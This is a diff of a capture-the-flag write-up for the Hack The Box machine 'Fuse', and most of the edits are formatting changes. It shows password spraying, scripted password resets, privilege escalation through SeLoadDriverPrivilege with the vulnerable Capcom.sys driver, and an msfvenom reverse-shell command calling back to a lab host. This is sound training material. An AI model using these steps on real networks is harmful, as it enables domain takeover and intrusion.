@@ -7,16 +7,16 @@ published: false
 ![](/assets/Fuse/Fuse.png)
 
 ### Summary
-- Fuse is a windows domain controller machine with IIS listening on port 80.
-- When checking the website, we get redirected to a certain web page titled "PaperCut Print Logger".
-- On that web page, we find the printing activity of some domain users. That gets us an initial list of usernames, workstations and document names.
-- One of the documents' name stuck out: `"Fabricorp01.docx"` which looked like a possible password/password scheme to try.
-- After spraying that password and others with the same pattern, We find that it was indeed used by 3 of the users found on the web page. But was expired and had to be changed.
-- Using the linux `smbpassswd` utility, we were able to change passwords and gain access. But we didn't get much further with traditional SMB share enumeration and AD Attacks (ASREPRoasting, Kerberoasting etc.).
-- However, when inspecting `Bloodhound`'s output, we notice that there's a potential path to Domain Administrator if we compromise the `svc-print` account. That's because it has PowerShell Remoting access and is a member of the Print Operators AD group which hold the dangerous `SeLoadDriver` privilege.
-- Following the theme of printing which was recurring throughout the machine, we enumerate the printers of the domain to find a password in one of the printers' description field.
-- We run another password spray over all domain users with that password and get access to the `svc-print` account. We use it to gain a remote PowerShell session on the box.
-- We abuse its `SeLoadDriverPrivilege` to load a vulnerable driver into the kernel and exploit that to get code execution as `NT Authority\System`.
+- Fuse is a **Windows Domain Controller** machine with **IIS** listening on port 80.
+- *When checking the website,* we get **redirected** to a certain **web page titled "PaperCut Print Logger".**
+- *On that page,* we find the **printing activity of some domain users**. That gets us an initial **list of usernames, workstations and document names.**
+- **One of the documents' name stuck out:** `"Fabricorp01.docx"` which ***looked like a possible password/password scheme to try.***
+- *After spraying that password and others with the same pattern,* We find that **it was indeed used by 3 of the users**. But was **expired and had to be changed.**
+- *Using the linux* `smbpassswd` *utility*, we were able to **change passwords and gain access**. But **neither of the users had WinRM capability or valuable findings in their SMB shares**.
+- *However, after doing a* `Bloodhound` *collection and inspecting the output*, we notice that **there's a potential path to Domain Administrator if we compromise the** `svc-print` **account**. That's because **it has PowerShell Remoting access and is a member of the Print Operators AD group** which **hold the dangerous** `SeLoadDriver` **privilege.**
+- *Following the findings from* `Bloodhound` *and the* ***theme of printing*** *which was recurring throughout the machine*, we **enumerate the printers of the domain** to **find a password in a printers' description field**.
+- We **run another password spray** over all domain users with that password and **get access to the** `svc-print` **account**. We use it to **gain a remote PowerShell session on the box.**
+- We  then **abuse its** `SeLoadDriverPrivilege` to **load a vulnerable driver into the kernel** and **exploit that to get code execution as** `NT Authority\System`.
 
 ---
 
@@ -74,26 +74,28 @@ Host script results:
 |   FQDN: Fuse.fabricorp.local
 |_  System time: 2022-08-17T03:34:53-07:00
 ```
-Spotting DNS, kerberos and LDAP is a dead giveaway of the box being a Domain Controller.
+Spotting **DNS, kerberos and LDAP** is a **dead giveaway** of the box being **a Domain Controller.**
 
-Nmap's version detection and default scripts give us good information:
-1. The host name is `fuse`
-2. It's very likely Windows Server 2016
-3. The domain name is `fabricorp.local`
+Nmap's **version detection** and **default scripts** give us good information:
+1. The **host name** is `fuse`
+2. It's very likely **Windows Server 2016**
+3. The **domain name** is `fabricorp.local`
 
-we also know that WSMan port 5985 is open which is good if we get a user with PowerShell Remoting access.
+we also know that **WSMan is available on port 5985** which **is good if we get a user with PowerShell Remoting access.**
 
 Let's start enumeration!
 
 ### SMB Enumeration
-We do the quick standard checks for null, guest and anonymous authentication:
+We do the **quick standard checks** for **null, guest and anonymous authentication:**
 
 ![](/assets/Fuse/smb-enum.jpg)
 
-nothing there besides confirming OS version `Windows Server 2016 Standard 14393` and knowing the processor architecture: `x64`
+nothing there besides **confirming OS version** `Windows Server 2016 Standard 14393` and **knowing the processor architecture:** `x64`
 
 ### RPC Enumeration
-My favourite RPC enumeration tool [`enum4linux-ng`](https://github.com/cddmp/enum4linux-ng) doesn't yield much more information either. I usually take away the Domain SID. But that's it.
+Our favourite **RPC enumeration tool** [enum4linux-ng](https://github.com/cddmp/enum4linux-ng) didn't yield much more information either.
+
+We **note down the Domain SID** and move along.
 ```bash
 enum4linux-ng.py -A fuse
 ```
@@ -230,106 +232,107 @@ Completed after 24.97 seconds
 ```
 
 ### LDAP Enumeration
-And the same goes for LDAP: anonymous bind isn't enabled:
+The same went for **LDAP**: **anonymous bind** isn't enabled :/
 
 ![](/assets/Fuse/no-ldap-anon.jpg)
 
 ### The Website
-Having cleared away all the quick and simple checks, it's time to take a look at the website.
+*Having cleared away all the quick and simple checks,* it's time to take a look at port 80.
 
 ![](/assets/Fuse/website-homepage.jpg)
 
-right off the bat, we get redirected to `/papercut/logs/html/index.htm`.
+*Right off the bat,* we get **redirected** to `/papercut/logs/html/index.htm`.
 
-we read the decription to know that live print logs are listed in the table below for us to check.
+we **read the decription** to know that **live print logs are listed in the table below** for us to check.
 
-Checking the first one, we take note of the usernames as well as the document and client names.
+*Checking the first one,* we see **usernames** as well as **document** and **computer** names.
 
 ![](/assets/Fuse/print-log-page-1.jpg)
 
-We do the same for the 2nd and 3rd log pages:
+We do the same for the 2nd and 3rd log pages.
 
 ![](/assets/Fuse/print-log-page-2.jpg)
 
 ![](/assets/Fuse/print-log-page-3.jpg)
 
-Our notes now:
-- Usernames: pmerton, tlavel, bnielson, sthompson, bhult and administrator
-- Workstations: JUMP01, LONWK015, LONWK019, LAPTOP07 and of course FUSE
+Our **notes**:
+- **Usernames:** pmerton, tlavel, bnielson, sthompson, bhult and administrator
+- **Workstations:** JUMP01, LONWK015, LONWK019, LAPTOP07 and of course FUSE
 
-And Document names:
+And **Document names**:
 - New Starter - bnielson
 - IT Budget Meeting Minutes
 - backup_tapes
 - mega_mountain_tape_request
-- Fabricorp01
+- **Fabricorp01**
 - offsite_dr_invocation
 - printing_issue_test
 
-All document names seem pretty normal. Except for that `Fabricorp01` :D
+All document names *seem pretty normal*. Except for that `Fabricorp01` :D
 
-A gut feeling tells us: "That's a password" XD
+A gut feeling is telling us: "That's a password!" XD
 
-And if not, it wouldn't be exhausting to try `Fabricorp02`, `Fabricorp03` and so on...
+*And if it wasn't,* it wouldn't hurt to try `Fabricorp02`, `Fabricorp03` and so on...
 
 ### Why not spray?
-Before delving into any password attacks, we're better off verifying the usernames we got. We're going to use `kerbrute` for that:
+*Before delving into any password attacks,* we're better off **verifying the usernames we got**. We're going to use [kerbrute](https://github.com/ropnop/kerbrute) for that:
 
 ![](/assets/Fuse/kerbrute-userenum.jpg)
 
-Awesome! every single one of them was valid!
+**Awesome! every single one of them was valid!**
 
-Having a list of valid usernames and another with potential passwords, we get to spraying..
+*Having a list of valid usernames and another with potential passwords,* we get to spraying..
 
 ![](/assets/Fuse/likely-pass-list.jpg)
 
 ![](/assets/Fuse/password-spray-1.jpg)
 
-`tlavel`, `bnielson` and `bhult` seem to have that password `Fabricorp01`. But it's expired.
+`tlavel`, `bnielson` and `bhult` seem to have that password `Fabricorp01`. But it's ***expired***.
 
 We need to find a way to reset it.
 
-RDP would've been nice here. But port 3389 isn't open :/
+***RDP would've been nice here***. But port 3389 isn't open :/
 
-After failing to reset the password dusing RPC's `setuserinfo2` command, we do some further research to find a handy tool called `smbpasswd`.
+*After failing to reset the password dusing RPC's* `setuserinfo2` *command*, we **do some further research** and **come across a handy tool** called `smbpasswd`.
 
-It was built for administering Samba but Let's take a look at its documentation:
+It was **built for administering Samba** but **Let's take a look at its documentation:**
 
 ![](/assets/Fuse/smbpasswd-docs.jpg)
 
-Jackpot! This is exactly what we need. let's change the password for a user and see if it works.
+**Jackpot! This is exactly what we need**. let's see if it can do the job.
 
 ![](/assets/Fuse/smbpasswd-change-pass.jpg)
 
-Awesome. We now have more room for enumeration.
+Awesome. We now **have more room for enumeration**.
 
 ### Authenticated Information Gathering
-Our access is now expanded with 3 users, we can try:
-1. Pulling the rest of the domain users and going for another `Fabricorp0X` spray.
-2. Enumerating all the SMB share access to check what's there.
-3. Doing a Bloodhound collection to see what's Kerberoastable, what's ASREPRoastable, what privileges our users have etc.
+**Our access is now expanded with 3 users**. We can try:
+1. **Pulling the rest of the domain users** and **going for another** `Fabricorp0X` **spray**.
+2. **Enumerating all the SMB share access** to check what's there.
+3. **Checking for WinRM access.**
+4. Doing a **Bloodhound collection** to see what's **Kerberoastable**, what's **ASREPRoastable**, **who has access to what** etc.
 
 And more.
 
-However, there's an obstacle.
+*However,* there's an obstacle.
 
 ![](/assets/Fuse/auto-reset-password-status.jpg)
 
-As explained in the image above, after we succesfully reset one user's password, it changed back to what it was.
+*As explained in the image above,* something happens after we reset one user's password. it changes back to what it was.
 
-There's automation going on. One that resets the password to the initial `Fabricorp01` around every minute and requires it to be changed.
+There's **automation** going on. One that **resets the password to the initial** `Fabricorp01` *around every minute* and **requires it to be changed.**
 
-To make our lives easier, we'll have to counter that automation with one of our own. Let's look at the help for the `smbpasswd` utility to see what options it offers:
+**To handle this and make our lives easier,** we'll have to **come up with automation of our own**. Let's look up the help for the `smbpasswd` utility to see **what options it offers:**
 
 ![](/assets/Fuse/smbpasswd-help.jpg)
 
-With the help of the `-s` flag, we can pass in passwords through `stdin`.
+*Turns out that, with the help of the* `-s` *flag*, we can **pass in passwords through** `stdin`.
 
 the old password + the new one + the confirmation would be fed to `smbpasswd` with a new line in between.
 
-minding that a new password must be given every time we do a reset. Because AD -by default- remembers the last 24 passwords you used on a given account.
+*minding that* **a new password must be given every time we do a reset**. Because **Active Directory** *-by default-* **remembers the last 24 passwords you used on a given account.** A feature called **"Password History"**.
 
-So it's better to have the password as a command line argument for our script.
+So it's better to **have the password as a command line argument** for our script.
 
 Here's what it looks like:
 
@@ -341,7 +344,7 @@ for user in {'tlavel','bnielson','bhult'}; do
 done
 ```
 
-we're targetting all the users there. Let's check their SMB share access and if they can use WinRM
+we're targetting all the users there. Let's **check their SMB share access** and **if they can use WinRM**
 
 ```bash
 cme winrm fuse -u $user -p $1
@@ -350,82 +353,90 @@ cme smb fuse -u $user -p $1 --shares
 
 ![](/assets/Fuse/automated-pass-reset.jpg)
 
-The script ran well. However, none of the users had WinRM access and we didn't find anything valuable in the SMB shares when we checked.
+The script ran well. *However,* **none of the users had WinRM access** and **we didn't find anything valuable in the SMB shares** when we checked.
 
-We modify the script to target only one user and pull all the domain users using `crackmapexec`
+*To prepare for a* ***full domain password spray,*** We **modify the script** to **target only one user** and **pull all the domain users** using `crackmapexec`
 
 ![](/assets/Fuse/getting-all-ad-users.jpg)
 
-We spray all the remaining ones with `Fabricorp01` through `Fabricorp09` but with no success :/
+We target all the remaining users with `Fabricorp01` through `Fabricorp09` but with no success :/
 
 ![](/assets/Fuse/2nd-password-spray.jpg)
 
 ### AD Enumeration with Bloodhound 
-After pulling a BloodHound collection using [`Bloodhound.py`](https://github.com/fox-it/BloodHound.py), We don't find anything exploitable with any of our owned users.
+We do a `BloodHound` collection from our Kali using [Bloodhound.py](https://github.com/fox-it/BloodHound.py). But don't find anything exploitable with any of our owned users.
 
-However, since the number of the users in the domain is relatively small, we inspected everyone up close.
+*However, since the number of the users in the domain is relatively small,* we **inspected everyone up close.**
 
 Until we found `svc-print`...
 
 ![](/assets/Fuse/svc-print-privs.jpg)
 
-This account is our target if we want to take over the domain.
+This account **is our target** to **take over the domain.**
 
 Because it can:
-1. Gain a remote shell into the Domain Controller (since it's part of the "Remote Management Users" group)
-2. Perform privilege escalation by abusing the `SeLoadDriverPrivilege` (a privilege held by all members of the "Print Operators" group) to load malicious drivers into the kernel.
+1. **Gain a remote shell onto the Domain Controller** (since **it's part of the "Remote Management Users"** group)
+2. **Perform privilege escalation** by **abusing the** `SeLoadDriverPrivilege` (a privilege **held by all members of the "Print Operators" group**) to **load malicious drivers into the kernel.**
 
-Right now, all of our attention is directed towards obtaining access to this account.
+*Right now,* **all of our attention is directed towards obtaining access to this account.**
 
 ### Printer Enumeration
-We can enumerate printers through RPC with a valid account.
+*Since printers have been mentioned way too many times in this machine* (the **website**, **SMB shares** and in **BloodHound**), we have to **do decent enumeration** on them.
 
-Let's re-run `enum4linux-ng` with credentials this time and see what comes up.
+We can do that via RPC with a valid account.
+
+Let's **re-run** `enum4linux-ng` **with credentials this time** and see what comes up.
 
 ![](/assets/Fuse/rpc-printer-enumeration.jpg)
 
-A password is there in the description :D
+A **password was there in the description** :D
 
-Naturally, we spray it to find both `svc-print` and `svc-scan` using it.
+we should've redone this part after obtaining those users. Oh well :/
 
-We used [`evil-winrm`](https://github.com/Hackplayers/evil-winrm) to get on the box and ignored `svc-scan` since it doesn't hold any special privileges..
+*Naturally,* we **spray that password**. To find both `svc-print` and `svc-scan` using it.
+
+We used [evil-winrm](https://github.com/Hackplayers/evil-winrm) to get on the box and **ignored** `svc-scan` *since it doesn't hold any special privileges..*
 
 ![](/assets/Fuse/print-pass-worked.jpg)
 
-With this access, it's time for some `SeLoadDriverPrivilege` abuse.
+*With this access,* it's time for some `SeLoadDriverPrivilege` abuse.
 
 ![](/assets/Fuse/se-load-driver-priv.jpg)
 
 ### Evil Driver Pwnage
-The amazing article by Tarlogic Cybersecurity [here](https://www.tarlogic.com/blog/abusing-seloaddriverprivilege-for-privilege-escalation/#0x01_-_Preamble) explains the theory and details the steps of exploitation. Give it a read for the full picture.
+The amazing [article](https://www.tarlogic.com/blog/abusing-seloaddriverprivilege-for-privilege-escalation/) by **Tarlogic Cybersecurity** explains the **theory** and details **the steps of exploitation**. Give it a read for the full picture.
 
-But in short, what we're going to do is:
-- Download a vulnerable driver: `Capcom.sys` [here](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys). And, yes, it's the game company :D we're deliberately using it because it can be exploited for Privesc.
-- Load it into the kernel with our held privilege using Tarlogic's [EoPLoadDriver](https://github.com/TarlogicSecurity/EoPLoadDriver/) tool
-- Exploit the driver using the public exploit from Tandasat [ExploitCapcom](https://github.com/tandasat/ExploitCapcom) after making a few modifications to its code
+*But, in short,* what we're going to do is:
+- **Download a vulnerable driver** (`Capcom.sys`) [here](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys). *-And, yes, it's the game company :D-* **we're deliberately using it because it can be exploited for Privesc**.
+- **Load it into the kernel** with our held privilege using **Tarlogic's** [EoPLoadDriver](https://github.com/TarlogicSecurity/EoPLoadDriver/) tool
+- **Exploit the driver** using the public exploit from **Tandasat** [ExploitCapcom](https://github.com/tandasat/ExploitCapcom) *(after making a few modifications to its code)*.
 
-We compile the `EoPLoadDriver.exe` using Visual Studio
+*After downloading* `Capcom.sys`, we compile the `EoPLoadDriver.exe` using **Visual Studio**
 
-Then modify the `ExploitCapcom` code before compiling it to run a reverse shell executable `rev.exe` instead of launching cmd.exe
+Then **modify** the `ExploitCapcom` code before compiling it to **run a reverse shell executable** `rev.exe` *(instead of launching cmd.exe)*
 
 ![](/assets/Fuse/modifying-exploit-capcom.jpg)
 
-And generate the reverse shell executable using `msfvenom`
+And **generate the reverse shell** using `msfvenom`
 
 ```bash
 msfvenom -p windows/x64/shell_reverse_tcp lhost=10.10.16.3 lport=9000 -f exe > rev.exe
 ```
 
-We pack the 4 items into an archive and upload it to the victim
+We **pack the 4 items into an archive** and **upload it to the victim**
 
 ![](/assets/Fuse/uploading-exploit-items.jpg)
 
-Now locked and loaded, we move the `rev.exe` back one directory to be in `C:\Users\svc-print\Documents` matching the path specified in the `ExploitCapcom.exe` executable
+*Now locked and loaded,* we move `rev.exe` back one directory to be in `C:\Users\svc-print\Documents` *(matching the path specified in the* `ExploitCapcom.exe` *executable)*
 
-And proceed to load `Capcom.sys` into the writable `HKCU:\System\CurrentControlSet` registry path using `EoPLoadDriver.exe` and name it `KillerDriver` for dramatic effect XD
+And proceed to **load** `Capcom.sys` into the *writable* `HKCU:\System\CurrentControlSet` **registry path** using `EoPLoadDriver.exe` and naming it `KillerDriver` for dramatic effect XD
 
-With the driver now in the kernel, we exploit it with `ExploitCapcom.exe` which runs the `rev.exe` to give us a nice reverse shell :D
+*With the driver now in the kernel,* we **exploit it** with `ExploitCapcom.exe` which **runs** the `rev.exe` to **give us a nice reverse shell :D**
 
 ![](/assets/Fuse/killer-driver.jpg)
 
-Murdered ;)
+***I guess we blew up a FUSE :P***
+
+**...**
+
+**Ahem! It was a good box :D**
